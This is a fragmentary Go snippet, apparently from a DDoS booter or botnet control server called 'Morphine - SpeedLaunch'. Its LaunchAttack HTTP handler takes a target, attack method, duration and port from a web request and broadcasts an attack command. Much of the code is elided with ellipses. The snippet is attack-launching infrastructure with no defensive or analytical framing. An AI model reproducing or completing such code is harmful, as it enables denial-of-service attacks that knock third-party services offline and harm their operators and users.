...
func main() {
	...
	fmt.Println("starting Morphine - SpeedLaunch [v1.0]")
...
func LaunchAttack(rw http.ResponseWriter, r *http.Request) {
	...
	if !NeedleHaystack(r.URL.Query().Get("method"), Config.Methods) {
		rw.Write([]byte("Unclassified method given..."))
		return //prints
	}
	...
	if err != nil { //error handles the reason properly
		rw.Write([]byte("unclassified duration given..."))
		return
	}
	...
	if err != nil { //error handles the reason properly
		rw.Write([]byte("unclassified port given..."))
		return
	}
	...
	if err := BroadcastCommand(r.URL.Query().Get("target"), r.URL.Query().Get("method"), Duration, Port); err != nil {
		rw.Write([]byte("failed to broadcast the attack command"))
		return
	}
